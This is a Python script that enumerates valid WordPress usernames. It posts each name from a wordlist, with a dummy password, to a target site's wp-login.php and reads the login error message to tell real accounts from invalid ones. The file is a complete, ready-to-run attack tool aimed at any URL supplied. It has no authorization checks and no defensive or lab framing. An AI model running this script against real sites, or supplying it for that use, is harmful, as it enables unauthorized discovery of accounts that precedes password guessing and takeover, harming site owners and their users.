#!/usr/bin/env python3

# ----------------------------------------------------------------------
# Copyright (c) 2024 QAEZZ A/K/A Reinitialize
#
# Simple script to brute force the username field of a WordPress login.
# Tested on WP 4.3.33.
# ----------------------------------------------------------------------

import requests
import html5lib
import argparse
from pathlib import Path
from bs4 import BeautifulSoup
import os
from sys import stdout


def get_args() -> tuple[str, str, int]:
    parser = argparse.ArgumentParser(
        description="Brute force the username field of a WordPress site.\nTested on WP 4.3.33."
    )
    parser.add_argument(
        "-u",
        "--url",
        dest="URL",
        help="The url of the site, prefix with http(s)://",
        required=True,
    )
    parser.add_argument(
        "-w",
        "--wordlist",
        dest="WORDLIST",
        help="The path to the wordlist you want to use.",
        required=True,
    )
    parser.add_argument(
        "-t",
        "--timeout",
        dest="TIMEOUT",
        help="Timeout of each request, default: 5.",
        required=False,
        default=5,
        type=int,
    )

    args = parser.parse_args()
    url: str = args.URL
    wordlist: str = args.WORDLIST
    timeout: int = args.TIMEOUT

    return (url, wordlist, timeout)


def check_if_site_up(site: str, timeout: int) -> tuple[bool, str]:
    try:
        resp = requests.get(site, timeout=float(timeout))
        if resp.ok:
            return (True, "Site is up.")
        return (False, f"Error: {resp.status_code}")
    except requests.exceptions.Timeout:
        return (False, "Connection timed out.")
    except requests.exceptions.ConnectionError:
        return (False, "Failed to connect to the site.")
    except requests.exceptions.RequestException as ex:
        return (False, f"Something went wrong!\n{str(ex)}")
    except ValueError:
        return (False, f"Timeout must be an int/float, not {type(timeout).__name__}.")
    except Exception as ex:
        return (False, f"Something else went wrong!\n{str(ex)}")


def check_if_file_exists(file_path: str) -> bool:
    file = Path(file_path)
    if file.is_file():
        return True

    return False


def brute_force(wp_login_url, wp_admin_url, wordlist, s, cookies) -> tuple[bool, str]:
    valid_username = None
    with open(wordlist, "r") as f:
        lines = f.readlines()
        max_line_length = 0
        for idx, line in enumerate(lines):
            line = line.strip()
            resp = s.post(
                wp_login_url,
                data={
                    "log": line,
                    "pwd": "hi mom",
                    "wp-submit": "Log+In",
                    "redirect_to": wp_admin_url,
                    "testcookie": "1",
                },
                cookies=cookies,
            )
            soup = BeautifulSoup(resp.content, "html5lib")
            login_error = soup.find("div", attrs={"id": "login_error"})
            if login_error:
                if "Cookies are blocked" in str(login_error):
                    print(
                        "The requests' library has blocked the cookies, WP will not work."
                    )
                    return

                elif "Invalid username" in str(login_error):
                    current_line = (
                        f"({idx:0{len(str(len(lines)))}}/{len(lines)}) Checked {line}"
                    )
                    padded_line = current_line.ljust(max_line_length)
                    stdout.write(f"\r{padded_line}")
                    stdout.flush()

                else:
                    valid_username = line
                    break

            max_line_length = max(max_line_length, len(current_line))

        # Move cursor up one line
        stdout.write("\x1b[1A")
        # Clear the line
        stdout.write("\x1b[2K")
        # Move cursor to beginning of line
        stdout.write("\r")
        # Clear to the end of the line
        stdout.write("\x1b[0K")
        stdout.flush()

        if valid_username:
            return (True, valid_username)
        return (False, "")


def main() -> None:
    url, wordlist, timeout = get_args()
    print(f"Site....: {url}\nWordlist: {wordlist}\nTimeout.: {timeout}\n")

    wp_login_url = f"{url}/wp-login.php"
    wp_admin_url = f"{url}/wp-admin"
    wordlist = os.path.abspath(wordlist)

    is_site_up = check_if_site_up(wp_login_url, timeout)

    if not is_site_up[0]:
        print(is_site_up[1])
        return
    elif not check_if_file_exists(wordlist):
        print("The wordlist path does not exist.")
        return

    s = requests.Session()
    cookies = dict(s.get(wp_login_url).cookies)

    result = brute_force(wp_login_url, wp_admin_url, wordlist, s, cookies)
    print(
        f"Username -> {result[1]}"
        if result[0]
        else "None of the usernames worked, sorry."
    )


if __name__ == "__main__":
    main()
